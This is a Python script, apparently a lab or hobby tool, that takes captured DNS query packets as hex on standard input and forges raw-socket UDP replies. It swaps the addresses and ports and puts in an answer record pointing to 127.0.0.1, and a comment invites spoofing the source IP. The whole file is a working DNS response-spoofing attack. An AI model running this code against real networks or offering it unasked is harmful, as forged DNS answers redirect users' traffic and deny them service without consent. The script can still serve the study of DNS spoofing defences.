import socket
import sys
from struct import pack


def checksum_func(data):
    checksum = 0
    data_len = len(data)
    if (data_len % 2):
        data_len += 1
        data += pack('!B', 0)

    for i in range(0, data_len, 2):
        w = (data[i] << 8) + (data[i + 1])
        checksum += w

    checksum = (checksum >> 16) + (checksum & 0xFFFF)
    checksum = ~checksum & 0xFFFF
    return checksum


    # ip header fields
ip_ihl = 5
ip_ver = 4
ip_tos = 0
ip_tot_len = 0  # kernel will fill the correct total length
ip_id = 54321  # Id of this packet
ip_frag_off = 0
ip_ttl = 255
ip_proto = socket.IPPROTO_UDP
ip_check = 0  # kernel will fill the correct checksum
ip_ihl_ver = (ip_ver << 4) + ip_ihl

while 1:
    raw_input = input()
    raw_input = raw_input[2:-2]
    data = bytearray.fromhex(raw_input)
    raw_input=bytes.fromhex(raw_input)
    source_ip = socket.inet_ntoa(raw_input[30:34])  # our  source ip is old dest ip
    dest_ip = socket.inet_ntoa(raw_input[26:30])  # our dest_ip is old src_ip

    ip_saddr = socket.inet_aton(source_ip)  # Spoof the source ip address if you want to
    ip_daddr = socket.inet_aton(dest_ip)

    # the ! in the pack format string means network order
    ip_header = pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check,
                     ip_saddr, ip_daddr)

    data[44:46] = bytes.fromhex('81 80')  # set response flag
    data[48:50] = bytes.fromhex('00 01')  # set response counter to 1
    data[52:54] = bytes.fromhex('00 00')  # set that there are not additional respones to query
    data = data[42:]
    data += (bytes.fromhex(
        "c0 0c 00 01 00 01 00 00 00 ed 00 04 7f 00 00 01"))  # standard response with last 4 bytes as 127.0.0.1
    udp_source = int.from_bytes(raw_input[36:38], byteorder='big')  # old dest port is now source port
    udp_dest = int.from_bytes(raw_input[34:36], byteorder='big')  # old src port is now dest port
    udp_length = 8 + len(data)
    udp_checksum = 0
    source_address = socket.inet_aton(source_ip)
    dest_address = socket.inet_aton(dest_ip)

    pseudo_header = pack('!BBH', 0, socket.IPPROTO_UDP, udp_length)
    pseudo_header = source_address + dest_address + pseudo_header
    udp_header = pack('!4H', udp_source, udp_dest, udp_length, udp_checksum)
    udp_checksum = checksum_func(pseudo_header + udp_header + data)
    udp_header = pack('!4H', udp_source, udp_dest, udp_length, udp_checksum)
    with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW) as s:
        s.sendto(ip_header + udp_header + data, (dest_ip, udp_dest))
